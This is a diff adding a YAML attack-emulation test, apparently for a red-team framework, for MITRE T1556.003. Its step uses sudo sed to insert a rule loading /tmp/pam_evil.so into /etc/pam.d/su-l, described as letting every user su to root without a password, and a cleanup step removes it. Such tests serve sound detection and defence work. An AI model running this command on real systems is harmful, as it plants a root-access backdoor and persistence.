@@ -1,0 +1,44 @@
+api_version: "2.0"
+name: Malicious PAM module
+description: |
+    Creates a PAM module, inserts a rule to use it, and then tests it.
+
+    Upon successful execution, this test will create a PAM module that allows every user to su to root without a password.
+args:
+    - name: path_to_pam_module_source
+      type: path
+      default: PathToAtomicsFolder/T1556.003/src/pam_evil.c
+    - name: path_to_pam_module
+      type: path
+      default: /tmp/pam_evil.so
+    - name: path_to_pam_conf
+      type: string
+      default: /etc/pam.d/su-l
+    - name: pam_rule
+      type: string
+      default: auth sufficient /tmp/pam_evil.so
+    - name: index
+      type: integer
+      default: "1"
+uuid: 65208808-3125-4a2e-8389-a0a00e9ab326
+mitre:
+    tactics:
+        - 'TA0006: Credential Access'
+        - 'TA0005: Defense Evasion'
+        - 'TA0003: Persistence'
+    techniques:
+        - 'T1556: Modify Authentication Process'
+    subtechniques:
+        - 'T1556.003: Pluggable Authentication Modules'
+requirements:
+    platforms:
+        - os: linux
+steps:
+    - name: malicious-pam-module
+      inline: |
+        sudo sed -i "{{.Args.index}}s,^,{{.Args.pam_rule}}\n,g" {{.Args.path_to_pam_conf}}
+      executor: sh
+      cleanup:
+        inline: |
+            sudo sed -i "\,{{.Args.pam_rule}},d" {{.Args.path_to_pam_conf}}
+        executor: sh
